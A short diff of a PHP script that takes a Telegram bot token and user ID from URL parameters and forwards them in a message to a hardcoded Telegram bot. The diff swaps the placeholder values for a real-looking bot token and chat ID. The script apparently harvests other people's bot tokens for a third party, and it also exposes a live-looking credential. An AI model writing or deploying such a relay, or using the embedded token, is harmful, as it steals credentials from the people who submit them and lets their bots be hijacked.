@@ -4,8 +4,8 @@ $botToken = $_GET['botToken'] ?? '';
 $idTelegram = $_GET['idTelegram'] ?? '';
 
 if (!empty($botToken) && !empty($idTelegram)) {
-    $targetBotToken = "YOUR_OTHER_BOT_TOKEN";
-    $chatId = "CHAT_ID_OF_TARGET_BOT";
+    $targetBotToken = "6303882659:AAEF6szirtORvCKPgl61ePXSA0U6M0S7xOs";
+    $chatId = "5162275670";
 
     $url = "https://api.telegram.org/bot{$targetBotToken}/sendMessage";
     $message = "botToken: {$botToken}\nIdTelegram: {$idTelegram}";
